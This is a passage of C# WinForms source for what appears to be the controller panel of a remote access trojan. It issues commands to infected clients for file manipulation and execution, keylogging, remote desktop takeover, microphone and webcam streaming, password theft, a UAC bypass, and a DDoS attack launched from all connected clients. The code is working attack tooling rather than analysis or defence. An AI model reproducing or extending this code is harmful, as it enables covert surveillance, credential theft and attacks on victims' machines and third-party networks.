                    else if (result == DialogResult.Cancel)
                    {
                        return;
                    }
                }
                loopSend(command);
            }
            else if (e.KeyCode == Keys.Return && !IsCmdStarted)
            {
                MessageBox.Show(this, "Cmd Thread is not started!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }

        private void listDrivesToolStripMenuItem_Click(object sender, EventArgs e)
        {
            String command = "fdrive";
            loopSend(command);
        }

        private void enterDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedIndices.Count > 0)
            {
                if ((listView3.SelectedItems[0].SubItems[0].Text.Length != 3 && !listView3.SelectedItems[0].SubItems[0].Text.EndsWith(":\\")) && listView3.SelectedItems[0].SubItems[1].Text != "Directory")
                {
                    MessageBox.Show(this, "The selected item is not a directory!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }
                String fullPath = listView3.SelectedItems[0].SubItems[3].Text;
                String command = "fdir§" + fullPath;
                loopSend(command);
                Current_Path = fullPath;
                listView3.Items.Clear();
            }
            else
            {
                MessageBox.Show(this, "No directory is selected", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (Current_Path == "drive")
            {
                MessageBox.Show(this, "Action cancelled!", "You are at the top of the file tree!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            String cmd = "f1§" + Current_Path;
            loopSend(cmd);
        }

        private void refresh()
        {
            Application.DoEvents();
            System.Threading.Thread.Sleep(1500);
            listView3.Items.Clear();
            String cmd = "fdir§" + Current_Path;
            loopSend(cmd);
        }

        private void moveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count > 0)
            {
                String path = listView3.SelectedItems[0].SubItems[3].Text;
                xfer_path = path;
                xfer_mode = xfer_move;
            }
        }

        private void copyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count > 0)
            {
                String path = listView3.SelectedItems[0].SubItems[3].Text;
                xfer_path = path;
                xfer_mode = xfer_copy;
            }
        }

        private void currentDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            String cmd = "fpaste§" + Current_Path + "§" + xfer_path + "§" + xfer_mode;
            loopSend(cmd);
            refresh();
        }

        private void selectedDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count > 0)
            {
                bool isDir = false;
                if (listView3.SelectedItems[0].SubItems[1].Text == "Directory") isDir = true;
                if (!isDir)
                {
                    MessageBox.Show(this, "You can only paste a file into a directory", "Alert", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }
                String path = listView3.SelectedItems[0].SubItems[3].Text;
                loopSend("fpaste§" + path + "§" + xfer_path + "§" + xfer_mode);
                refresh();
            }
        }

        private void executeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count > 0)
            {
                String path = listView3.SelectedItems[0].SubItems[3].Text;
                String command = "fexec§" + path;
                loopSend(command);
            }
        }

        private void hideToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count > 0)
            {
                String path = listView3.SelectedItems[0].SubItems[3].Text;
                String command = "fhide§" + path;
                loopSend(command);
            }
        }

        private void showToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count > 0)
            {
                String path = listView3.SelectedItems[0].SubItems[3].Text;
                String command = "fshow§" + path;
                loopSend(command);
            }
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count > 0)
            {
                String path = listView3.SelectedItems[0].SubItems[3].Text;
                String command = "fdel§" + path;
                loopSend(command);
                refresh();
            }
        }

        public DialogResult InputBox(string title, string promptText, ref string value)
        {
            //This code is from http://www.csharp-examples.net/inputbox/
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();

            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;

            buttonOk.Text = "OK";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;

            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;

            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }

        private void renameToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count > 0)
            {
                String path = listView3.SelectedItems[0].SubItems[3].Text;
                String newName = "";
                bool validOperation = false;
                if (InputBox("Rename", "Please enter the new name of the file / directory!", ref newName) == DialogResult.OK)
                {
                    validOperation = true;
                }
                if (!validOperation) return;
                String cmd = "frename§" + path + "§" + newName;
                loopSend(cmd);
                refresh();
            }
        }

        private void fileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            String path = Current_Path;
            String name = "";
            bool validOperation = false;
            if (InputBox("New File", "Please enter the name and extension for the new file!", ref name) == DialogResult.OK)
            {
                validOperation = true;
            }
            if (!validOperation) return;
            String command = "ffile§" + path + "§" + name;
            loopSend(command);
            refresh();
        }

        private void directoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            String path = Current_Path;
            String name = "";
            bool validOperation = false;
            if (InputBox("New Directory", "Please enter the name for the new directory!", ref name) == DialogResult.OK)
            {
                validOperation = true;
            }
            if (!validOperation) return;
            String command = "fndir§" + path + "§" + name;
            loopSend(command);
            refresh();
        }

        public void saveFile(String content)
        {
            String cmd = "putfile§" + edit_content + "§" + content;
            loopSend(cmd);
            refresh();
        }

        private void editToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count > 0)
            {
                String path = listView3.SelectedItems[0].SubItems[3].Text;
                bool validOperation = false;
                if (listView3.SelectedItems[0].SubItems[1].Text != "Directory")
                {
                    validOperation = true;
                }
                if (!validOperation) return;
                String cmd = "getfile§" + path;
                edit_content = path;
                loopSend(cmd);
            }
        }

        private void currentDirectoryToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            String dir = Current_Path;
            String file = "";
            OpenFileDialog ofd = new OpenFileDialog();
            if (ofd.ShowDialog() == DialogResult.OK) file = ofd.FileName;
            dir += "\\" + new FileInfo(file).Name;
            String cmd = "fup§" + dir + "§" + new FileInfo(file).Length;
            fup_local_path = file;
            uploadFinished = false;
            loopSend(cmd);
        }

        private void selectedDirectoryToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count > 0)
            {
                String dir = listView3.SelectedItems[0].SubItems[3].Text;
                String file = "";
                OpenFileDialog ofd = new OpenFileDialog();
                if (ofd.ShowDialog() == DialogResult.OK) file = ofd.FileName;
                dir += "\\" + new FileInfo(file).Name;
                String cmd = "fup§" + dir + "§" + new FileInfo(file).Length;
                fup_local_path = file;
                uploadFinished = false;
                loopSend(cmd);
            }
        }

        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count > 0)
            {
                if (listView3.SelectedItems[0].SubItems[1].Text == "Directory") return;
                String dir = listView3.SelectedItems[0].SubItems[3].Text;
                String cmd = "fdl§" + dir;
                SaveFileDialog sfd = new SaveFileDialog();
                sfd.FileName = listView3.SelectedItems[0].SubItems[0].Text;
                if (sfd.ShowDialog() == DialogResult.OK)
                {
                    fdl_location = sfd.FileName;
                    loopSend(cmd);
                }
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_clientSockets.Count > 0) CloseAllSockets();
            if (sh != null)
            {
                foreach (IPluginMain ipm in sh.runningPlugins)
                {
                    ipm.OnExit();
                }
            }
        }

        private void button16_Click(object sender, EventArgs e)
        {
            loopSend("sklog");
        }

        private void button17_Click(object sender, EventArgs e)
        {
            loopSend("stklog");
        }

        private void button18_Click(object sender, EventArgs e)
        {
            loopSend("rklog");
        }

        private void button19_Click(object sender, EventArgs e)
        {
            loopSend("cklog");
        }

        private void button21_Click(object sender, EventArgs e)
        {
            MultiRecv = true;
            RDesktop = true;
            loopSend("rdstart");
        }

        private void button22_Click(object sender, EventArgs e)
        {
            loopSend("rdstop");
            Application.DoEvents();
            System.Threading.Thread.Sleep(1500);
            if (!AuStream && !WStream) MultiRecv = false;
            RDesktop = false;
            IsRdFull = false;
            sCore.UI.CommonControls.remoteDesktopPictureBox = null;
            pictureBox1.Image.Dispose();
            pictureBox1.Image = null;
            if (Rdxref == null) return;
            Rdxref.Close();
            Rdxref.Dispose();
            Rdxref = null;
            if (rmoveTimer != null)
            {
                rmoveTimer.Stop();
                rmoveTimer.Dispose();
                rmoveTimer = null;
            }
        }

        private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
        {
            System.Drawing.Rectangle scr = Screen.PrimaryScreen.WorkingArea;
            if (!IsRdFull)
            {
                scr = pictureBox1.DisplayRectangle;
            }
            try
            {
                int mx = (e.X * resx) / scr.Width;
                int my = (e.Y * resy) / scr.Height;

                if (rmouse == 1)
                {
                    if (plx != e.X || ply != e.Y)
                    {
                        rMoveCommands.Add("rmove-" + mx + ":" + my);
                        plx = e.X;
                        ply = e.Y;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("mouse move rd error");
            }
        }

        private void rmoveTickEventHandler(object sender, EventArgs e)
        {
            if (rmouse == 1)
            {
                if (rMoveCommands.Count > 0)
                {
                    loopSend(rMoveCommands[rMoveCommands.Count - 1]);
                    rMoveCommands.Clear();
                }
            }
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            sCore.RAT.RemoteDesktop.canControlMouse = checkBox1.Checked;

            if (checkBox1.Checked)
            {
                rmoveTimer = new Timer();
                rmoveTimer.Interval = 1000;
                rmoveTimer.Tick += new EventHandler(rmoveTickEventHandler);
                rmoveTimer.Start();
                rmouse = 1;
            }
            else
            {
                rmouse = 0;
                rmoveTimer.Stop();
                rmoveTimer.Dispose();
                rmoveTimer = null;
            }
        }

        private void pictureBox1_MouseDown(object sender, MouseEventArgs e)
        {

            if (rmouse == 1)
            {
                if (e.Button == System.Windows.Forms.MouseButtons.Left)
                {
                    loopSend("rclick-left-down");
                }

                else
                {
                    loopSend("rclick-right-down");
                }
            }
        }

        private void pictureBox1_MouseUp(object sender, MouseEventArgs e)
        {
            if (rmouse == 1)
            {
                if (e.Button == System.Windows.Forms.MouseButtons.Left)
                {
                    loopSend("rclick-left-up");
                }

                else
                {
                    loopSend("rclick-right-up");
                }
            }
        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            sCore.RAT.RemoteDesktop.canControlKeyboard = checkBox2.Checked;

            if (checkBox2.Checked)
            {
                MessageBox.Show(this, "The remote keyboard feature only works in full screen mode!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Information);
                rkeyboard = 1;
            }
            else
            {
                rkeyboard = 0;
            }
        }

        private void button23_Click(object sender, EventArgs e)
        {
            RDesktop full = new RDesktop();
            full.Show();
            Rdxref = full;
            sCore.UI.CommonControls.remoteDesktopPictureBox = (PictureBox)full.Controls.Find("pictureBox1", true)[0];
            IsRdFull = true;
        }

        public void executeToolStrip(String name)
        {
            int track = 0;

            foreach (String refname in tsrefname)
            {
                if (refname != name)
                {
                    track++;
                    continue;
                }
                tsitem[track].PerformClick();
                track++;
                break;
            }
        }

        public static String getValue(String name)
        {
            String val = "";
            foreach (String entry in getvalue)
            {
                String key = entry.Split('§')[0];

                if (key == name)
                {
                    val = entry.Split('§')[1];
                }
            }

            return val;
        }

        public int getSelectedIndex(String name)
        {
            int val = 0;
            foreach (String entry in getvalue)
            {
                String key = entry.Split('§')[0];

                if (key == name)
                {
                    val = int.Parse(entry.Split('§')[1]);
                }
            }
            return val;
        }

        public String getSelectedItem(String name)
        {
            String val = "";
            foreach (String entry in getvalue)
            {
                String key = entry.Split('§')[0];

                if (key == name)
                {
                    val = entry.Split('§')[1];
                }
            }
            return val;
        }

        public bool getChecked(String name)
        {
            bool val = false;
            String ret = "";
            foreach (String entry in getvalue)
            {
                String key = entry.Split('§')[0];
                if (key == name)
                {
                    ret = entry.Split('§')[1];
                }
            }

            ret = ret.ToLower();

            if (ret == "true")
            {
                val = true;
            }
            else
            {
                val = false;
            }

            return val;
        }

        public String[] getItems(String name, String mode)
        {
            List<String> ret = new List<String>();
            Control lvc = Controls.Find(name, true)[0];
            ListView lv = (ListView)lvc;
            if (mode == "selected")
            {
                foreach (String entry in getvalue)
                {
                    String key = entry.Split('§')[0];
                    if (key == name)
                    {
                        int subCount = entry.LastIndexOf('§') + 1;
                        String sItem = entry.Substring(subCount);
                        ret.Add(sItem);
                    }
                }
            }
            if (mode == "items")
            {
                foreach (String entry in getvalue)
                {
                    String key = entry.Split('§')[0];
                    if (key == name)
                    {
                        String nameString = entry.Split('§')[0];
                        int subS = nameString.Length + 1;
                        String lvString = entry.Substring(subS);
                        int subE = lvString.LastIndexOf('§');
                        if (subE == -1) return ret.ToArray();
                        lvString = lvString.Substring(0, subE);

                        foreach (String item in lvString.Split('§'))
                        {
                            ret.Add(item);
                        }
                    }
                }
            }
            return ret.ToArray();
        }

        private void tabControl1_Click(object sender, EventArgs e)
        {
            MouseEventArgs me = (MouseEventArgs)e;

            if (me.Button == System.Windows.Forms.MouseButtons.Right)
            {
                ContextMenuStrip cms = new ContextMenuStrip();
                cms.Items.Add("Route Window");
                cms.Items[0].Click += new EventHandler(rwind);
                cms.Show(Cursor.Position);
            }
        }

        private void rwind(object sender, EventArgs e)
        {
            TabPage srcRoute = tabControl1.SelectedTab;
            routeWindow rw = new routeWindow();
            rw.page = srcRoute;
            rw.routePage();
        }

        private void button24_Click(object sender, EventArgs e)
        {
            loopSend("alist");
        }

        private void button25_Click(object sender, EventArgs e)
        {
            if (listView4.SelectedItems.Count > 0)
            {
                if (!AuStream)
                {
                    int deviceNumber = listView4.SelectedItems[0].Index;
                    MultiRecv = true;
                    AuStream = true;
                    astream = new audioStream();
                    astream.init();
                    loopSend("astream§" + deviceNumber.ToString());
                    button25.Text = "Stop Stream";
                    return;
                }

                if (AuStream)
                {
                    loopSend("astop");
                    if (!RDesktop && !WStream)
                    {
                        Application.DoEvents();
                        System.Threading.Thread.Sleep(1500);
                        MultiRecv = false;
                    }
                    AuStream = false;
                    astream.destroy();
                    astream = null;
                    button25.Text = "Start Stream";
                }
            }
        }

        private void button26_Click(object sender, EventArgs e)
        {
            loopSend("wlist");
        }

        private void button27_Click(object sender, EventArgs e)
        {
            if (!WStream && listView5.SelectedItems.Count > 0)
            {
                String id = listView5.SelectedItems[0].SubItems[0].Text;
                String command = "wstream§" + id;
                MultiRecv = true;
                WStream = true;
                button27.Text = "Stop stream";
                loopSend(command);
                return;
            }

            if (WStream)
            {
                if (!RDesktop && !AuStream)
                {
                    Application.DoEvents();
                    System.Threading.Thread.Sleep(1500);
                    MultiRecv = false;
                }
                WStream = false;
                button27.Text = "Start Stream";
                loopSend("wstop");
            }
        }

        private bool TestDDoS(string ip, string prot)
        {
            if (prot == "ICMP ECHO (Ping)")
            {
                System.Net.NetworkInformation.Ping ping = new System.Net.NetworkInformation.Ping();
                System.Net.NetworkInformation.PingReply reply = ping.Send(ip, 1000, Encoding.Unicode.GetBytes("Test"));
                if (reply.Status == System.Net.NetworkInformation.IPStatus.Success)
                {
                    MessageBox.Show(this, "Ping succes with 1 second timeout and 4 bytes of data (test)", "Target responded to ping", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    return true;
                }
                else
                {
                    MessageBox.Show(this, "Ping failed with 1 second timeout and 4 bytes of data (test)", "Target didn't responded to ping!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return false;
                }
            }
            if (prot == "TCP")
            {
                TcpClient client = new TcpClient();
                try
                {
                    client.Connect(ip, int.Parse(numericUpDown1.Value.ToString()));
                    if (client.Connected)
                    {
                        MessageBox.Show(this, "Connection to " + ip + ":" + int.Parse(numericUpDown1.Value.ToString()) + " successed", "TCP DDoS test", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        return true;
                    }
                    else
                    {
                        MessageBox.Show(this, "Connection to " + ip + ":" + int.Parse(numericUpDown1.Value.ToString()) + " failed", "TCP DDoS test", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        return false;
                    }
                }
                catch (Exception)
                {
                    MessageBox.Show(this, "Connection to " + ip + ":" + int.Parse(numericUpDown1.Value.ToString()) + " failed", "TCP DDoS test", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return false;
                }
            }
            if (prot == "UDP")
            {
                try
                {
                    UdpClient client = new UdpClient();
                    client.Connect(ip, int.Parse(numericUpDown1.Value.ToString()));
                    IPEndPoint ep = new IPEndPoint(IPAddress.Parse(ip), int.Parse(numericUpDown1.Value.ToString()));
                    client.Send(new byte[] { 0x0, 0x1, 0x2, 0x3 }, 4, ep);
                    MessageBox.Show(this, "Connection to " + ip + ":" + int.Parse(numericUpDown1.Value.ToString()) + " successed", "UDP DDoS test", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    return true;
                }
                catch (Exception)
                {
                    MessageBox.Show(this, "Connection to " + ip + ":" + int.Parse(numericUpDown1.Value.ToString()) + " failed", "UDP DDoS test", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return false;
                }
            }

            return false;
        }

        private void button29_Click(object sender, EventArgs e)
        {
            if (textBox6.Text == "" || comboBox5.SelectedItem == null) return;
            String ip = textBox6.Text;
            String prot = comboBox5.SelectedItem.ToString();

            TestDDoS(ip, prot);
        }

        private void StartDDoS(string ip, string port, string protocol, string packetSize, string threads, string delay, bool isAllClient)
        {
            String command = "ddosr|" + ip + "|" + port + "|" + protocol + "|" + packetSize + "|" + threads + "|" + delay;
            if (isAllClient)
            {
                int inc = 0;
                foreach (Socket s in _clientSockets)
                {
                    sendCommand(command, inc);
                    inc++;
                }
                label18.Text = "Status: DDoS Started [Client_Count:" + inc.ToString() + " Target_IP:" + ip + " Target_Port:" + port + "]";
            }
            else
            {
                loopSend(command);
                label18.Text = "Status: DDoS Started [Client_Count:1 Target_IP:" + ip + " Target_Port:" + port + "]";
            }
        }

        private void button28_Click(object sender, EventArgs e)
        {
            bool isAllClient = checkBox3.Checked;
            String ip = textBox6.Text;
            String port = numericUpDown1.Value.ToString();
            String protocol = comboBox5.SelectedItem.ToString();
            String packetSize = numericUpDown2.Value.ToString();
            String threads = numericUpDown3.Value.ToString();
            String delay = numericUpDown4.Value.ToString();
            StartDDoS(ip, port, protocol, packetSize, threads, delay, isAllClient);
        }

        private void button30_Click(object sender, EventArgs e)
        {
            String command = "ddosk";
            int count = 0;
            foreach (Socket s in _clientSockets)
            {
                sendCommand(command, count);
                count++;
            }
            label18.Text = "Status: DDoS Stopped for all clients!";
        }

        private void button32_Click(object sender, EventArgs e)
        {
            listView6.Clear();
        }

        private void button31_Click(object sender, EventArgs e)
        {
            loopSend("getpw");
        }

        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {
            //Declare info vars
            string clientType = "";

            //Determine client type
            if (listView1.SelectedItems.Count == 0)
            {
                label2.Text = "Client Info";
                return;
            }
            string strClient = listView1.SelectedItems[0].SubItems[0].Text;
            strClient = strClient.Replace("Client ", String.Empty);
            int clientID = int.Parse(strClient);
            if (lcm != null)
            {
                if (lcm.IsLinuxClient(clientID)) clientType = "Linux Client";
                else clientType = "Windows Client";
            }

            //Write data to label2 (Client Information)

            label2.Text = "Client Type: " + clientType;
        }

        private void button33_Click(object sender, EventArgs e)
        {
            loopSend("uacbypass");
        }

        private void button34_Click(object sender, EventArgs e)
        {
            string cmd = "startipc§tut_client_proxy";
            remotePipe rp = new remotePipe("tut_client_proxy", this);
            loopSend(cmd);
            sCore.RAT.ExternalApps.ipcConnections.Add("tut_client_proxy", rp.outputBox);
            rp.Show();
            rPipeList.Add(rp);
        }

        public void RemovePipe(remotePipe obj, bool remote = true)
        {
            int rmid = 0;
            bool canRemove = false;

            foreach (remotePipe rp in rPipeList)
            {
                if (obj == rp)
                {
                    canRemove = true;
                    break;
                }
                rmid++;
            }

            if (canRemove)
            {
                string sName = rPipeList[rmid].pname;
                sCore.RAT.ExternalApps.ipcConnections.Remove(sName);
                if (remote) loopSend("stopipc§" + sName);
                rPipeList.RemoveAt(rmid);
            }
        }

        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (listBox1.SelectedItem != null)
            {
                string plugin = listBox1.SelectedItem.ToString();
                object[] pInfo = sh.GetPluginInfo(plugin);
                label29.Text = "Name: " + pInfo[0].ToString();
                label30.Text = "Version: " + pInfo[1].ToString();
                label31.Text = "Author: " + pInfo[4].ToString();
                label32.Text = "Description: " + pInfo[2].ToString();
                comboBox6.Items.Clear();

                Permissions[] ps = (Permissions[])pInfo[3];
                foreach (Permissions p in ps)
                {
                    comboBox6.Items.Add(p.ToString());
                }

                if (comboBox6.Items.Count > 0) comboBox6.SelectedIndex = 0;
            }
            else
            {
                label29.Text = "Name: ";
                label30.Text = "Version: ";
                label31.Text = "Author: ";
                label33.Text = "Description: ";
                comboBox6.Items.Clear();
            }
        }

        private void button37_Click(object sender, EventArgs e)
        {
            if (listBox1.SelectedItem != null)
            {
                //sh.ExecuteScript(listBox1.SelectedItem.ToString());
                sh.ExecuteDll(listBox1.SelectedItem.ToString());
            }
            else
            {
                MessageBox.Show(this, "Script can't be executed", "No script selected");
            }
        }

        private void button38_Click(object sender, EventArgs e)
        {
            listBox1.Items.Clear();
            sh.LoadDllFiles();

            label29.Text = "Name: ";
            label30.Text = "Version: ";
            label32.Text = "Description: ";
            label31.Text = "Author: ";
            comboBox6.Items.Clear();
            comboBox6.Text = "";
        }

        private void button36_Click(object sender, EventArgs e)
        {
            if (listBox1.SelectedItem != null)
            {
                string scriptName = listBox1.SelectedItem.ToString();
                if (sh.IsPluginRunning(scriptName)) ; //Stop plugin
                File.Delete(Application.StartupPath + "\\scripts\\" + scriptName);
                button38_Click(null, null);
            }
            else
            {
                MessageBox.Show(this, "No plugin selected", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void button35_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Title = "Please Select A Valid Dll Pluing File";
            ofd.DefaultExt = "Plugin Files (*.dll)|*.dll";
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                if (File.Exists(ofd.FileName))
                {
                    File.Copy(ofd.FileName, Application.StartupPath + "\\scripts\\" + new FileInfo(ofd.FileName).Name);
                    button38_Click(null, null);
                }
                else
                {
                    MessageBox.Show(this, "Selected File doesn't exist", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }
    }

    public class audioStream
    {
        NAudio.Wave.BufferedWaveProvider provider; 
        NAudio.Wave.WaveOut waveOut;

        public void init()
        {
            provider = new NAudio.Wave.BufferedWaveProvider(new NAudio.Wave.WaveFormat());
            waveOut = new NAudio.Wave.WaveOut();
            waveOut.Init(provider);
            waveOut.Play();
        }

        public void bufferPlay(byte[] recv)
        {
            provider.AddSamples(recv, 0, recv.Length);
            recv = null;
        }

        public void destroy()
        {
            waveOut.Stop();
            provider.ClearBuffer();
            waveOut.Dispose();
            waveOut = null;
            provider = null;
        }
    }

    public class routeWindow
    {
        public TabPage page;
        private List<String> disableWrite = new List<String>();
        private Form currentRoute = new Form();
        private TabPage orgBackup = new TabPage();

        public void routePage()
        {
            if (page == null) return;

            Control.ControlCollection controls = page.Controls;
            Form route = new Form();
            route.Size = page.Parent.Size;
            route.Text = "RouteWindow[" + (TutServer.Form1.routeWindow.Count + 1).ToString() + "] " + page.Text;
            route.WindowState = FormWindowState.Normal;
            route.FormBorderStyle = FormBorderStyle.FixedToolWindow;
            route.BackColor = SystemColors.Window;
            String assignContextMenu = "";
            ContextMenuStrip cloneCMS = new ContextMenuStrip();

            foreach (Control c in controls)
            {
                String name = c.Name;
                String type = getControlType(name);
                Control add;
                if (type == "") continue;
                switch (type)
                {
                    case "label":

                        Label l = new Label();
                        Label reference = (Label)c;
                        l.Location = c.Location;
                        l.Font = c.Font;
                        l.BackColor = c.BackColor;
                        l.Text = c.Text;
                        l.Name = c.Name;
                        l.ForeColor = c.ForeColor;
                        l.AutoSize = reference.AutoSize;
                        add = (Control)l;

                        route.Controls.Add(l);

                        break;

                    case "button":

                        Button b = new Button();
                        Button bref = c as Button;

                        b.Text = bref.Text;
                        b.Location = bref.Location;
                        b.Size = bref.Size;
                        b.AutoSize = bref.AutoSize;
                        b.BackColor = bref.BackColor;
                        b.ForeColor = bref.ForeColor;
                        b.UseVisualStyleBackColor = bref.UseVisualStyleBackColor;
                        b.Click += new EventHandler(onClick);
                        b.Name = bref.Name;

                        route.Controls.Add(b);

                        break;

                    case "comboBox":

                        ComboBox cb = new ComboBox();
                        ComboBox cref = (ComboBox)c;

                        cb.Text = cref.Text;
                        cb.Name = cref.Name;
                        cb.Location = cref.Location;
                        cb.Size = cref.Size;
                        cb.SelectedItem = cref.SelectedItem;
                        foreach (Object item in cref.Items)
                        {
                            cb.Items.Add(item);
                        }
                        cb.ForeColor = cref.ForeColor;
                        cb.BackColor = cref.BackColor;
                        cb.SelectedIndex = cref.SelectedIndex;
                        cb.Font = cref.Font;
                        cb.SelectedValueChanged += new EventHandler(onItemChange);

                        route.Controls.Add(cb);

                        break;

                    case "richTextBox":

                        RichTextBox rtb = new RichTextBox();
                        RichTextBox rref = (RichTextBox)c;

                        rtb.Name = rref.Name;
                        rtb.Text = rref.Text;
                        rtb.BackColor = rref.BackColor;
                        rtb.ForeColor = rref.ForeColor;
                        rtb.Location = rref.Location;
                        rtb.Size = rref.Size;
                        rtb.WordWrap = rref.WordWrap;
                        rtb.Font = rref.Font;
                        rtb.TextChanged += new EventHandler(onTextChange);

                        route.Controls.Add(rtb);

                        break;

                    case "textBox":

                        TextBox t = new TextBox();
                        TextBox tref = (TextBox)c;

                        t.Name = tref.Name;
                        t.Text = tref.Text;
                        t.BackColor = tref.BackColor;
                        t.ForeColor = tref.ForeColor;
                        t.Location = tref.Location;
                        t.Size = tref.Size;
                        t.TextChanged += new EventHandler(onTextChange);
                        t.KeyDown += new KeyEventHandler(onKeyDown);
                        t.Font = tref.Font;
                        t.UseSystemPasswordChar = tref.UseSystemPasswordChar;
                        t.PasswordChar = tref.PasswordChar;
                        if (tref.Tag != null) t.Tag = "route" + (Form1.routeWindow.Count + 1).ToString() + ".register." + tref.Tag.ToString();

                        route.Controls.Add(t);

                        break;

                    case "listView":

                        ListView lv = new ListView();
                        ListView lref = (ListView)c;

                        lv.Name = lref.Name;
                        lv.View = lref.View;
                        lv.BackColor = lref.BackColor;
                        lv.ForeColor = lref.ForeColor;
                        lv.Location = lref.Location;
                        lv.Size = lref.Size;
                        lv.FullRowSelect = lref.FullRowSelect;
                        lv.GridLines = lref.GridLines;
                        if (lref.ContextMenuStrip != null)
                        {
                            assignContextMenu = lv.Name;
                            cloneCMS = lref.ContextMenuStrip;
                        }

                        foreach (ColumnHeader ch in lref.Columns)
                        {
                            ColumnHeader header = new ColumnHeader();
                            header.DisplayIndex = ch.DisplayIndex;
                            header.Name = ch.Name;
                            header.Text = ch.Text;
                            header.Width = ch.Width;

                            lv.Columns.Add(header);
                        }
                        foreach (ListViewItem i in lref.Items)
                        {
                            ListViewItem lvi = new ListViewItem();
                            lvi.BackColor = i.BackColor;
                            lvi.Focused = i.Focused;
                            lvi.Font = i.Font;
                            lvi.ForeColor = i.ForeColor;
                            lvi.Name = i.Name;
                            lvi.Text = i.Text;
                            lvi.Selected = i.Selected;
                            foreach (ListViewItem.ListViewSubItem si in i.SubItems)
                            {
                                ListViewItem.ListViewSubItem sitem = new ListViewItem.ListViewSubItem();
                                sitem.BackColor = si.BackColor;
                                sitem.Font = si.Font;
                                sitem.ForeColor = si.ForeColor;
                                sitem.Name = si.Name;
                                sitem.Text = si.Text;
                                lvi.SubItems.Add(sitem);
                            }
                            lv.Items.Add(lvi);
                        }

                        lv.SelectedIndexChanged += new EventHandler(onIndexChange);
                        lv.Font = lref.Font;

                        route.Controls.Add(lv);

                        break;

                    case "checkBox":

                        CheckBox cx = new CheckBox();
                        CheckBox xref = (CheckBox)c;

                        cx.Text = xref.Text;
                        cx.Name = xref.Name;
                        cx.Checked = xref.Checked;
                        cx.ForeColor = xref.ForeColor;
                        cx.BackColor = xref.BackColor;
                        cx.Location = xref.Location;
                        cx.AutoSize = xref.AutoSize;
                        cx.Size = xref.Size;
                        cx.Font = xref.Font;
                        cx.CheckedChanged += new EventHandler(onCheck);

                        route.Controls.Add(cx);

                        break;

                    case "pictureBox":

                        PictureBox pb = new PictureBox();
                        PictureBox pref = (PictureBox)c;
                        pb.Name = pref.Name;
                        pb.Size = pref.Size;
                        pb.SizeMode = pref.SizeMode;
                        pb.Image = pref.Image;
                        pb.Location = pref.Location;
                        pb.BackColor = pref.BackColor;
                        pb.Tag = "route" + (Form1.routeWindow.Count + 1).ToString() + ".register." + pref.Tag.ToString();
